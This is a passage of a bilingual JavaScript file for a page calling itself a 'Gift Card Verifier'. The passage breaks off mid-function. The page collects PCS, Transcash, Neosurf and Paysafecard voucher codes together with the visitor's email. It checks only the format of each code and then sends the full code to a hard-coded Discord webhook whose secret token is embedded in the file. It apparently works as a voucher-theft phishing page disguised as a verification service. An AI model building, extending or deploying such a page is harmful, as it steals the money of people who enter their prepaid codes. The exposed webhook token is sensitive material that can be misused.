// ===== CONFIGURATION =====
// ⚠️ Pour une production réelle, placez ce webhook derrière un backend/proxy sécurisé.
// ⚠️ Attention : Ce webhook est exposé côté client. En production, utilisez un proxy backend.
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1530834730633789612/s1De5VDBXy9mL4nTYxp4CJ1CUA3NcRq_-HvVljq1NYbdqW_a7ZfRBKcNSiBfxRBE3SmT';
const DISCORD_ROLE_MENTION = '';

const STORAGE_KEYS = {
    language: 'preferred-language',
    theme: 'preferred-theme'
};

const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
const canHover = window.matchMedia('(hover: hover) and (pointer: fine)');

// ===== SÉCURITÉ LOCALSTORAGE =====
function safeStorageGet(key, fallback = null) {
    try {
        const value = localStorage.getItem(key);
        return value !== null ? value : fallback;
    } catch {
        return fallback;
    }
}

function safeStorageSet(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch {
        return false;
    }
}

function safeStorageRemove(key) {
    try {
        localStorage.removeItem(key);
        return true;
    } catch {
        return false;
    }
}

const CARD_RULES = {
    PCS: {
        key: 'PCS',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: {
            fr: 'Code PCS',
            en: 'PCS code'
        },
        help: {
            fr: 'PCS : 10 caractères alphanumériques.',
            en: 'PCS: 10 alphanumeric characters.'
        },
        meta: {
            fr: 'Format détecté : 10 caractères',
            en: 'Expected format: 10 characters'
        },
        placeholder: 'A7218JH12',
        displayName: 'PCS',
        formatDesc: '10 caractères',
        logo: 'pcs'
    },
    Transcash: {
        key: 'Transcash',
        allowed: /\D/g,
        validate: value => /^\d{12}$/.test(value),
        format: value => value,
        maxLength: 12,
        label: {
            fr: 'Code Transcash',
            en: 'Transcash code'
        },
        help: {
            fr: 'Transcash : 12 chiffres.',
            en: 'Transcash: 12 digits.'
        },
        meta: {
            fr: 'Format détecté : 12 chiffres',
            en: 'Expected format: 12 digits'
        },
        placeholder: '123456789012',
        displayName: 'Transcash',
        formatDesc: '12 chiffres',
        logo: 'transcash'
    },
    Neosurf: {
        key: 'Neosurf',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: {
            fr: 'Code Neosurf',
            en: 'Neosurf code'
        },
        help: {
            fr: 'Neosurf : 10 caractères.',
            en: 'Neosurf: 10 characters.'
        },
        meta: {
            fr: 'Format détecté : 10 caractères',
            en: 'Expected format: 10 characters'
        },
        placeholder: '12345ABCDE',
        displayName: 'Neosurf',
        formatDesc: '10 caractères',
        logo: 'neosurf'
    },
    Paysafecard: {
        key: 'Paysafecard',
        allowed: /\D/g,
        validate: value => /^\d{16}$/.test(value),
        format: value => value,
        maxLength: 16,
        label: {
            fr: 'Code Paysafecard',
            en: 'Paysafecard code'
        },
        help: {
            fr: 'Paysafecard : 16 chiffres.',
            en: 'Paysafecard: 16 digits.'
        },
        meta: {
            fr: 'Format détecté : 16 chiffres',
            en: 'Expected format: 16 digits'
        },
        placeholder: '1234567890123456',
        displayName: 'Paysafecard',
        formatDesc: '16 chiffres',
        logo: 'paysafe'
    }
};

// Logos SVG pour l'aperçu
const CARD_LOGOS = {
    pcs: `<svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;border-radius:8px;">
            <rect width="100" height="40" rx="8" fill="#1A237E"/>
            <text x="10" y="24" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#FFFFFF">PCS</text>
            <text x="46" y="24" font-family="Arial, sans-serif" font-size="10" fill="#90CAF9">Mastercard</text>
            <circle cx="82" cy="20" r="12" fill="#FF5F00" opacity="0.82"/>
            <circle cx="90" cy="20" r="12" fill="#F79E1B" opacity="0.82"/>
        </svg>`,
    transcash: `<svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;border-radius:8px;">
            <rect width="100" height="40" rx="8" fill="#E91E63"/>
            <text x="15" y="20" font-family="Arial, sans-serif" font-size="12" font-weight="bold" fill="#FFFFFF">Transcash</text>
            <text x="15" y="32" font-family="Arial, sans-serif" font-size="8" fill="#F8BBD0">by Transfond</text>
        </svg>`,
    neosurf: `<svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;border-radius:8px;">
            <rect width="100" height="40" rx="8" fill="#00BCD4"/>
            <text x="12" y="22" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#FFFFFF">neosurf</text>
            <text x="70" y="22" font-family="Arial, sans-serif" font-size="8" fill="#B2EBF2">voucher</text>
        </svg>`,
    paysafe: `<svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;border-radius:8px;">
            <rect width="100" height="40" rx="8" fill="#FF6B00"/>
            <text x="8" y="22" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#FFFFFF">paysafe</text>
            <text x="68" y="22" font-family="Arial, sans-serif" font-size="10" fill="#FFD54F">card</text>
            <circle cx="88" cy="20" r="8" fill="#FFFFFF" opacity="0.28"/>
        </svg>`
};

const translations = {
    fr: {
        header: {
            tagline: 'Interface de vérification modernisée'
        },
        hero: {
            badge: 'Expérience premium • validation en temps réel',
            title: 'Vérificateur de Cartes Cadeaux',
            subtitle: 'Vérifiez le format de vos cartes PCS, Transcash, Neosurf et Paysafecard puis transmettez votre demande avec une interface moderne, claire et responsive.'
        },
        form: {
            title: 'Vérifier une carte',
            subtitle: 'Sélectionnez une carte, saisissez le code attendu et transmettez la demande à l\'équipe de traitement.',
            cardType: 'Type de carte',
            cardHint: 'Choisissez une carte pour adapter le format du code',
            selectPlaceholder: '-- Choisissez une carte --',
            noCardSelected: 'Aucune carte sélectionnée',
            selectedCardPrefix: 'Carte sélectionnée :',
            pin: 'Code',
            pinMetaDefault: 'Le format dépend de la carte choisie',
            pinHelpDefault: 'Choisissez une carte pour charger le bon format.',
            pinRequired: 'Veuillez saisir un code.',
            email: 'Votre email',
            amount: 'Montant initial (optionnel)',
            purchaseDate: 'Date d\'achat (optionnel)',
            message: 'Message supplémentaire (optionnel)',
            securityTitle: 'Transmission du formulaire',
            security: 'Les champs sont validés dans le navigateur puis transmis à la destination configurée, sans sauvegarde locale du contenu du formulaire.',
            submit: 'Envoyer la demande',
            sending: 'Envoi...'
        },
        footer: {
            subtitle: 'UI premium, responsive et prête pour l\'évolution du backend',
            privacy: 'Politique de confidentialité',
            terms: 'Conditions d\'utilisation',
            copy: '© 2026 GiftCard Verifier. Tous droits réservés.'
        },
        modal: {
            title: 'Demande envoyée',
            description: 'Votre demande a été transmise à la destination configurée. Si un suivi est effectué, il utilisera l\'adresse email renseignée dans le formulaire.',
            close: 'Fermer'
        },
        theme: {
            toDark: 'Activer le mode sombre',
            toLight: 'Activer le mode clair'
        },
        noscript: {
            message: 'Certaines fonctionnalités interactives nécessitent JavaScript. Le formulaire reste utilisable, mais la validation en temps réel est désactivée.'
        },
        validation: {
            selectCard: 'Veuillez sélectionner un type de carte.',
            pinRequired: 'Veuillez saisir un code.',
            pinInvalidFor: card => `Le format du code ${card} est invalide.`,
            pinNeedsCard: 'Choisissez une carte pour valider le code.',
            emailInvalid: 'Veuillez entrer un email valide.',
            amountNegative: 'Le montant ne peut pas être négatif.',
            amountInvalid: 'Veuillez entrer un montant valide (ex: 50.00).',
            dateInvalid: 'Veuillez entrer une date valide.',
            dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
        },
        result: {
            error: 'Une erreur est survenue pendant l\'envoi. Vérifiez la configuration du webhook puis réessayez.',
            timeout: 'La demande a expiré. Veuillez réessayer.'
        },
        beforeunload: 'Vous avez des modifications non sauvegardées. Êtes-vous sûr de vouloir quitter ?'
    },
    en: {
        header: {
            tagline: 'Modernized verification interface'
        },
        hero: {
            badge: 'Premium experience • real-time validation',
            title: 'Gift Card Verifier',
            subtitle: 'Check the expected format for PCS, Transcash, Neosurf and Paysafecard codes, then submit your request through a modern, clear and responsive interface.'
        },
        form: {
            title: 'Verify a card',
            subtitle: 'Select a card, enter the expected code and submit the request to the processing team.',
            cardType: 'Card type',
            cardHint: 'Choose a card to load the matching code format',
            selectPlaceholder: '-- Choose a card --',
            noCardSelected: 'No card selected',
            selectedCardPrefix: 'Selected card:',
            pin: 'Code',
            pinMetaDefault: 'The format depends on the selected card',
            pinHelpDefault: 'Choose a card to load the right format.',
            pinRequired: 'Please enter a code.',
            email: 'Your email',
            amount: 'Initial amount (optional)',
            purchaseDate: 'Purchase date (optional)',
            message: 'Additional message (optional)',
            securityTitle: 'Form transmission',
            security: 'Fields are validated in the browser, then sent to the configured destination without storing the form content locally.',
            submit: 'Send request',
            sending: 'Sending...'
        },
        footer: {
            subtitle: 'Premium, responsive UI ready for backend evolution',
            privacy: 'Privacy policy',
            terms: 'Terms of service',
            copy: '© 2026 GiftCard Verifier. All rights reserved.'
        },
        modal: {
            title: 'Request sent',
            description: 'Your request has been transmitted to the configured destination. If follow-up happens, it will use the email address entered in the form.',
            close: 'Close'
        },
        theme: {
            toDark: 'Enable dark mode',
            toLight: 'Enable light mode'
        },
        noscript: {
            message: 'Some interactive features require JavaScript. The form remains usable, but real-time validation is disabled.'
        },
        validation: {
            selectCard: 'Please select a card type.',
            pinRequired: 'Please enter a code.',
            pinInvalidFor: card => `The ${card} code format is invalid.`,
            pinNeedsCard: 'Choose a card before validating the code.',
            emailInvalid: 'Please enter a valid email address.',
            amountNegative: 'Amount cannot be negative.',
            amountInvalid: 'Please enter a valid amount (e.g. 50.00).',
            dateInvalid: 'Please enter a valid date.',
            dateFuture: 'Purchase date cannot be in the future.'
        },
        result: {
            error: 'An error occurred while sending the form. Check the webhook configuration and try again.',
            timeout: 'Request timed out. Please try again.'
        },
        beforeunload: 'You have unsaved changes. Are you sure you want to leave?'
    }
};

// ===== POLYFILLS =====
if (!Element.prototype.matches) {
    Element.prototype.matches = Element.prototype.msMatchesSelector || 
                              Element.prototype.webkitMatchesSelector;
}

if (!Array.from) {
    Array.from = function(arrayLike) {
        return [].slice.call(arrayLike);
    };
}

// ===== ÉLÉMENTS DOM =====
const elements = {
    body: document.body,
    form: document.getElementById('verificationForm'),
    cardTypeSelect: document.getElementById('cardTypeSelect'),
    cardTypeInput: document.getElementById('cardType'),
    cardTypeError: document.getElementById('cardTypeError'),
    pinInput: document.getElementById('pin'),
    pinLabel: document.getElementById('pinLabel'),
    pinHelp: document.getElementById('pinHelp'),
    pinMetaHint: document.getElementById('pinMetaHint'),
    pinFieldWrap: document.getElementById('pinFieldWrap'),
    pinError: document.getElementById('pinError'),
    emailInput: document.getElementById('email'),
    emailFieldWrap: document.getElementById('emailFieldWrap'),
    emailError: document.getElementById('emailError'),
    amountInput: document.getElementById('amount'),
    amountError: document.getElementById('amountError'),
    purchaseDateInput: document.getElementById('purchaseDate'),
    dateError: document.getElementById('dateError'),
    messageInput: document.getElementById('message'),
    submitBtn: document.getElementById('submitBtn'),
    btnText: document.getElementById('btnText'),
    btnLoader: document.getElementById('btnLoader'),
    result: document.getElementById('result'),
    langButtons: Array.from(document.querySelectorAll('.lang-btn')),
    themeToggle: document.getElementById('themeToggle'),
    themeIcon: document.querySelector('#themeToggle i'),
    selectedCardHint: document.getElementById('selectedCardHint'),
    cardPreview: document.getElementById('cardPreview'),
    cardPreviewLogo: document.getElementById('cardPreviewLogo'),
    cardPreviewName: document.getElementById('cardPreviewName'),
    cardPreviewFormat: document.getElementById('cardPreviewFormat'),
    successModal: document.getElementById('successModal'),
    closeSuccessModal: document.getElementById('closeSuccessModal'),
    successModalCard: document.querySelector('#successModal .modal-card'),
    confettiLayer: document.getElementById('confettiLayer'),
    particlesCanvas: document.getElementById('particles'),
    heroSection: document.querySelector('.hero'),
    cardSelectWrapper: document.getElementById('cardSelectWrapper')
};

// ===== ÉTAT =====
let currentLang = 'fr';
let currentTheme = 'light';
let previousFocusedElement = null;
let isInitialized = false;
let isFormDirty = false;
let formSubmitted = false;
let debounceTimers = {};
let animationFrameId = null;
let resizeObserver = null;

// ===== FONCTIONS UTILES =====
function getCurrentTranslations() {
    return translations[currentLang] || translations.fr;
}

function translate(keyPath) {
    const keys = keyPath.split('.');
    let value = getCurrentTranslations();

    for (const key of keys) {
        value = value?.[key];
    }

    return value;
}

// ===== GESTION DE LA SALETÉ DU FORMULAIRE =====
function markFormDirty() {
    if (!formSubmitted) {
        isFormDirty = true;
    }
}

function markFormClean() {
    isFormDirty = false;
}

function getSelectedCardRule() {
    return CARD_RULES[elements.cardTypeInput.value] || null;
}

// ===== DEBOUNCE =====
function debounce(key, fn, delay = 150) {
    if (debounceTimers[key]) {
        clearTimeout(debounceTimers[key]);
    }
    debounceTimers[key] = setTimeout(() => {
        delete debounceTimers[key];
        fn();
    }, delay);
}

// ===== GESTION DU THÈME =====
function updateThemeButton() {
    const toDark = currentTheme !== 'dark';
    elements.themeIcon.className = `fas ${toDark ? 'fa-moon' : 'fa-sun'}`;
    const label = toDark ? getCurrentTranslations().theme.toDark : getCurrentTranslations().theme.toLight;
    elements.themeToggle.setAttribute('aria-label', label);
    elements.themeToggle.setAttribute('title', label);
}

function applyTheme(theme) {
    currentTheme = theme === 'dark' ? 'dark' : 'light';
    elements.body.classList.toggle('dark', currentTheme === 'dark');
    safeStorageSet(STORAGE_KEYS.theme, currentTheme);
    updateThemeButton();
}

// ===== GESTION DE LA LANGUE =====
function setLanguage(lang) {
    currentLang = translations[lang] ? lang : 'fr';
    const t = getCurrentTranslations();
    document.documentElement.lang = currentLang;

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const value = translate(el.getAttribute('data-i18n'));
        if (typeof value === 'string') {
            el.textContent = value;
        }
    });

    // Mettre à jour le placeholder du select
    const selectPlaceholder = elements.cardTypeSelect.querySelector('option[value=""]');
    if (selectPlaceholder) {
        selectPlaceholder.textContent = t.form.selectPlaceholder;
    }

    elements.langButtons.forEach(btn => {
        btn.classList.toggle('active', btn.dataset.lang === currentLang);
    });

    safeStorageSet(STORAGE_KEYS.language, currentLang);
    updateDynamicText();
    updateThemeButton();
    updateCardPreview();
}

// ===== GESTION DES CARTES =====
function updateCardPreview() {
    const selectedValue = elements.cardTypeSelect.value;
    const t = getCurrentTranslations();

    if (selectedValue && CARD_RULES[selectedValue]) {
        const rule = CARD_RULES[selectedValue];
        const logoHtml = CARD_LOGOS[rule.logo] || '';
        
        elements.cardPreviewLogo.innerHTML = logoHtml || `<span class="card-preview-placeholder">${rule.displayName}</span>`;
        elements.cardPreviewName.textContent = rule.displayName;
        elements.cardPreviewFormat.textContent = rule.formatDesc;
        elements.cardPreview.classList.add('has-card');
        elements.selectedCardHint.textContent = `${t.form.selectedCardPrefix} ${rule.displayName}`;
    } else {
        elements.cardPreviewLogo.innerHTML = `<span class="card-preview-placeholder">${t.form.selectPlaceholder}</span>`;
        elements.cardPreviewName.textContent = '--';
        elements.cardPreviewFormat.textContent = '--';
        elements.cardPreview.classList.remove('has-card');
        elements.selectedCardHint.textContent = t.form.cardHint;
    }

    // Mettre à jour le champ hidden
    elements.cardTypeInput.value = selectedValue;
    
    updateDynamicText();
    validateCardSelection(false);
}

function selectCard(cardValue) {
    if (!CARD_RULES[cardValue]) {
        elements.cardTypeSelect.value = '';
        updateCardPreview();
        return;
    }
    
    elements.cardTypeSelect.value = cardValue;
    updateCardPreview();
    validatePin(false);
    markFormDirty();
}

// ===== VALIDATION DES CHAMPS =====
function setInputState(wrapper, iconClass, state) {
    wrapper.classList.remove('input-neutral', 'input-progress', 'input-valid', 'input-invalid');
    wrapper.classList.add(state);
    const icon = wrapper.querySelector('i');
    if (icon) {
        icon.className = iconClass;
    }
}

function sanitizePin(rawValue) {
    const rule = getSelectedCardRule();
    if (!rule) {
        return rawValue.replace(/\s/g, '').toUpperCase().slice(0, 20);
    }

    const cleaned = rawValue.replace(rule.allowed, '');
    const formatted = rule.format(cleaned);
    return formatted.slice(0, rule.maxLength);
}

function validatePin(showError = false) {
    const rule = getSelectedCardRule();
    const value = sanitizePin(elements.pinInput.value);
    elements.pinInput.value = value;

    if (!rule) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', value ? 'input-progress' : 'input-neutral');
        if (showError) {
            elements.pinError.textContent = getCurrentTranslations().validation.pinNeedsCard;
        } else {
            elements.pinError.textContent = '';
        }
        return false;
    }

    if (!value) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
        if (showError) {
            elements.pinError.textContent = getCurrentTranslations().validation.pinRequired;
        } else {
            elements.pinError.textContent = '';
        }
        return false;
    }

    if (rule.validate(value)) {
        setInputState(elements.pinFieldWrap, 'fas fa-check-circle', 'input-valid');
        elements.pinError.textContent = '';
        return true;
    }

    setInputState(elements.pinFieldWrap, 'fas fa-key', showError ? 'input-invalid' : 'input-progress');
    if (showError) {
        elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
    } else {
        elements.pinError.textContent = '';
    }
    return false;
}

function validateEmail(showError = false) {
    const value = elements.emailInput.value.trim();

    if (!value) {
        setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
        if (showError) {
            elements.emailError.textContent = getCurrentTranslations().validation.emailInvalid;
        } else {
            elements.emailError.textContent = '';
        }
        return false;
    }

    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    setInputState(
        elements.emailFieldWrap,
        valid ? 'fas fa-check-circle' : 'fas fa-envelope',
        valid ? 'input-valid' : (showError ? 'input-invalid' : 'input-progress')
    );

    elements.emailError.textContent = valid || !showError ? '' : getCurrentTranslations().validation.emailInvalid;
    return valid;
}

function validateCardSelection(showError = false) {
    const hasSelection = Boolean(elements.cardTypeInput.value);
    elements.cardTypeError.textContent = hasSelection || !showError ? '' : getCurrentTranslations().validation.selectCard;
    return hasSelection;
}

function validateAmount(showError = false) {
    const value = elements.amountInput.value.trim();
    if (!value) {
        elements.amountError.textContent = '';
        return true;
    }

    if (!/^\d+(\.\d{1,2})?$/.test(value)) {
        if (showError) {
            elements.amountError.textContent = getCurrentTranslations().validation.amountInvalid;
        } else {
            elements.amountError.textContent = '';
        }
        return false;
    }

    const amount = parseFloat(value);
    if (isNaN(amount) || amount < 0) {
        if (showError) {
            elements.amountError.textContent = getCurrentTranslations().validation.amountNegative;
        } else {
            elements.amountError.textContent = '';
        }
        return false;
    }

    elements.amountError.textContent = '';
    return true;
}

function validateDate(showError = false) {
    const value = elements.purchaseDateInput.value;
    if (!value) {
        elements.dateError.textContent = '';
        return true;
    }

    if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    const selectedDate = new Date(value);
    if (isNaN(selectedDate.getTime())) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    const today = new Date();
    today.setHours(0, 0, 0, 0);

    if (selectedDate > today) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateFuture;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    elements.dateError.textContent = '';
    return true;
}

function validateForm() {
    const cardOk = validateCardSelection(true);
    const pinOk = validatePin(true);
    const emailOk = validateEmail(true);
    const amountOk = validateAmount(true);
    const dateOk = validateDate(true);

    return cardOk && pinOk && emailOk && dateOk;
}

// ===== GESTION DES MESSAGES =====
function showInlineError(message) {
    elements.result.classList.remove('hidden', 'success');
    elements.result.classList.add('error');
    elements.result.textContent = message;
}

function showInlineSuccess(message) {
    elements.result.classList.remove('hidden', 'error');
    elements.result.classList.add('success');
    elements.result.textContent = message;
}

function clearInlineResult() {
    elements.result.classList.add('hidden');
    elements.result.classList.remove('success', 'error');
    elements.result.textContent = '';
}

// ===== GESTION DYNAMIQUE DES TEXTES =====
function updateDynamicText() {
    const t = getCurrentTranslations();
    elements.emailInput.placeholder = currentLang === 'fr' ? 'vous@exemple.com' : 'you@example.com';
    elements.amountInput.placeholder = '50.00';
    elements.messageInput.placeholder = currentLang === 'fr' ? 'Informations complémentaires...' : 'Additional details...';

    const rule = getSelectedCardRule();
    if (rule) {
        elements.pinLabel.textContent = rule.label[currentLang];
        elements.pinHelp.textContent = rule.help[currentLang];
        elements.pinMetaHint.textContent = rule.meta[currentLang];
        elements.pinInput.placeholder = rule.placeholder;
        elements.pinInput.maxLength = rule.maxLength;
    } else {
        elements.pinLabel.textContent = t.form.pin;
        elements.pinHelp.textContent = t.form.pinHelpDefault;
        elements.pinMetaHint.textContent = t.form.pinMetaDefault;
        elements.pinInput.placeholder = currentLang === 'fr' ? 'Sélectionnez une carte d\'abord' : 'Select a card first';
        elements.pinInput.removeAttribute('maxLength');
    }
}

// ===== ENVOI À DISCORD =====
async function sendToDiscord(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    const embed = {
        title: '🎫 Nouvelle demande de vérification',
        color: 0x6366F1,
        fields: [
            { name: '👤 Email', value: data.email, inline: false },
            { name: '💳 Type de carte', value: data.cardType, inline: true },
            { name: '🔑 Code', value: `\`${data.pin}\``, inline: true },
            { name: '💰 Montant', value: data.amount || 'Non spécifié', inline: true },
            { name: '📅 Date d\'achat', value: data.purchaseDate || 'Non spécifié', inline: true },
            { name: '📝 Message', value: data.message || 'Aucun message', inline: false },
            { name: '🌐 Langue', value: data.lang.toUpperCase(), inline: true }
        ],
        footer: {
            text: `Demande reçue le ${data.timestamp}`
        }
    };

    const payload = {
        content: DISCORD_ROLE_MENTION ? `<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.` : 'Nouvelle demande à traiter.',
        embeds: [embed],
        username: 'GiftCard Verifier',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response.ok;
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error(getCurrentTranslations().result.timeout);
        }
        throw error;
    }
}

// ===== RÉINITIALISATION DU FORMULAIRE =====
function resetFormState() {
    elements.form.reset();
    elements.cardTypeSelect.value = '';
    elements.cardTypeInput.value = '';
    updateCardPreview();
    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    elements.pinError.textContent = '';
    elements.emailError.textContent = '';
    elements.cardTypeError.textContent = '';
    elements.amountError.textContent = '';
    elements.dateError.textContent = '';
    updateDynamicText();
    markFormClean();
    formSubmitted = false;
}

// ===== MODAL SUCCÈS =====
function createConfetti() {
    if (!elements.confettiLayer) return;
    elements.confettiLayer.innerHTML = '';

    if (prefersReducedMotion.matches) {
        return;
    }

    const colors = ['#6366f1', '#8b5cf6', '#10b981', '#f59e0b', '#ec4899'];

    for (let index = 0; index < 18; index += 1) {
        const piece = document.createElement('span');
        piece.className = 'confetti-piece';
        piece.style.left = `${6 + Math.random() * 88}%`;
        piece.style.animationDelay = `${Math.random() * 250}ms`;
        piece.style.setProperty('--piece-color', colors[index % colors.length]);
        piece.style.setProperty('--piece-x', `${(Math.random() - 0.5) * 160}px`);
        piece.style.setProperty('--piece-rotate', `${90 + Math.random() * 260}deg`);
        elements.confettiLayer.appendChild(piece);
    }
}

function openSuccessModal() {
    previousFocusedElement = document.activeElement;
    createConfetti();
    elements.successModal.classList.remove('hidden');
    elements.successModal.setAttribute('aria-hidden', 'false');
    elements.body.classList.add('modal-open');
    formSubmitted = true;
    markFormClean();
    requestAnimationFrame(() => elements.closeSuccessModal.focus());
}

function closeSuccessModal() {
    elements.successModal.classList.add('hidden');
    elements.successModal.setAttribute('aria-hidden', 'true');
    elements.body.classList.remove('modal-open');
    previousFocusedElement?.focus?.();
}

// ===== PARTICULES =====
function initParticles() {
    const canvas = elements.particlesCanvas;
    const hero = elements.heroSection;
    if (!canvas || !hero) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let particles = [];
    let width = 0;
    let height = 0;
    const particleCount = 30;

    const resizeCanvas = () => {
        const rect = hero.getBoundingClientRect();
        width = Math.max(1, Math.floor(rect.width));
        height = Math.max(1, Math.floor(rect.height));
        canvas.width = width * Math.min(window.devicePixelRatio || 1, 2);
        canvas.height = height * Math.min(window.devicePixelRatio || 1, 2);
        canvas.style.width = `${width}px`;
        canvas.style.height = `${height}px`;
        ctx.setTransform(1, 0, 0, 1, 0, 0);
        ctx.scale(Math.min(window.devicePixelRatio || 1, 2), Math.min(window.devicePixelRatio || 1, 2));

        particles = Array.from({ length: particleCount }, () => ({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.35,
            vy: (Math.random() - 0.5) * 0.35,
            radius: 1.5 + Math.random() * 2.7,
            alpha: 0.12 + Math.random() * 0.22
        }));
    };

    const draw = () => {
        ctx.clearRect(0, 0, width, height);

        particles.forEach(particle => {
            particle.x += particle.vx;
            particle.y += particle.vy;

            if (particle.x <= 0 || particle.x >= width) particle.vx *= -1;
            if (particle.y <= 0 || particle.y >= height) particle.vy *= -1;

            ctx.beginPath();
            ctx.fillStyle = `rgba(99, 102, 241, ${particle.alpha})`;
            ctx.arc(particle.x, particle.y, particle.radius, 0, Math.PI * 2);
            ctx.fill();
        });

        animationFrameId = requestAnimationFrame(draw);
    };

    resizeCanvas();

    if (!prefersReducedMotion.matches) {
        draw();
    }

    if (typeof ResizeObserver !== 'undefined') {
        resizeObserver = new ResizeObserver(() => resizeCanvas());
        resizeObserver.observe(hero);
    }
    window.addEventListener('resize', resizeCanvas);

    window.addEventListener('beforeunload', () => {
        if (animationFrameId) cancelAnimationFrame(animationFrameId);
        if (resizeObserver) resizeObserver.disconnect();
    }, { once: true });
}

// ===== LAZY LOADING AVEC INTERSECTION OBSERVER =====
function initLazyLoading() {
    if ('IntersectionObserver' in window) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        }, { 
            threshold: 0.1,
            rootMargin: '50px'
        });
        
        document.querySelectorAll('.glass-panel:not(.hero-content .glass-panel)').forEach(el => {
            observer.observe(el);
        });
    } else {
        document.querySelectorAll('.glass-panel').forEach(el => {
            el.classList.add('visible');
        });
    }
}

// ===== BEFOREUNLOAD =====
function handleBeforeUnload(event) {
    if (isFormDirty && !formSubmitted) {
        event.preventDefault();
        event.returnValue = getCurrentTranslations().beforeunload;
        return event.returnValue;
    }
}

// ===== CHARGEMENT INITIAL =====
function init() {
    if (isInitialized) return;
    isInitialized = true;

    document.body.classList.add('js-ok');

    const noJsMsg = document.querySelector('.no-js-message');
    if (noJsMsg) noJsMsg.style.display = 'none';

    const savedLang = safeStorageGet(STORAGE_KEYS.language) || 'fr';
    const savedTheme = safeStorageGet(STORAGE_KEYS.theme) || 'light';

    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    applyTheme(savedTheme);
    setLanguage(savedLang);

    const today = new Date();
    const todayISO = today.toISOString().split('T')[0];
    elements.purchaseDateInput.setAttribute('max', todayISO);

    bindEvents();
    initParticles();
    initLazyLoading();

    window.addEventListener('beforeunload', handleBeforeUnload);
    window.addEventListener('pagehide', cleanup);

    document.body.classList.add('loaded');
}

// ===== NETTOYAGE =====
function cleanup() {
    if (animationFrameId) cancelAnimationFrame(animationFrameId);
    if (resizeObserver) resizeObserver.disconnect();
    Object.keys(debounceTimers).forEach(key => {
        clearTimeout(debounceTimers[key]);
        delete debounceTimers[key];
    });
    window.removeEventListener('beforeunload', handleBeforeUnload);
}

// ===== GESTION DES ÉVÉNEMENTS =====
function handleGlobalKeydown(event) {
    if (event.key === 'Escape') {
        if (!elements.successModal.classList.contains('hidden')) {
            closeSuccessModal();
            event.preventDefault();
        }
    }
}

function bindEvents() {
    elements.langButtons.forEach(btn => {
        btn.addEventListener('click', () => setLanguage(btn.dataset.lang));
    });

    elements.themeToggle.addEventListener('click', () => {
        applyTheme(currentTheme === 'dark' ? 'light' : 'dark');
    });

    // Sélection des cartes via le select
    elements.cardTypeSelect.addEventListener('change', () => {
        const value = elements.cardTypeSelect.value;
        if (value && CARD_RULES[value]) {
            selectCard(value);
        } else {
            elements.cardTypeSelect.value = '';
            updateCardPreview();
            validateCardSelection(false);
        }
        markFormDirty();
        // Focus sur le champ PIN après sélection
        setTimeout(() => {
            if (document.activeElement !== elements.pinInput) {
                elements.pinInput.focus();
            }
        }, 100);
    });

    // Fermeture de la modal
    elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
    const modalBackdrop = elements.successModal.querySelector('[data-close-modal]');
    if (modalBackdrop) {
        modalBackdrop.addEventListener('click', closeSuccessModal);
    }

    // Validation en temps réel avec debounce
    elements.pinInput.addEventListener('input', () => {
        markFormDirty();
        debounce('pin', () => validatePin(false), 150);
    });
    elements.pinInput.addEventListener('blur', () => validatePin(Boolean(elements.pinInput.value)));

    elements.emailInput.addEventListener('input', () => {
        markFormDirty();
        debounce('email', () => validateEmail(false), 150);
    });
    elements.emailInput.addEventListener('blur', () => validateEmail(Boolean(elements.emailInput.value)));

    elements.amountInput.addEventListener('input', () => {
        markFormDirty();
        debounce('amount', () => validateAmount(false), 150);
    });
    elements.amountInput.addEventListener('blur', () => validateAmount(true));

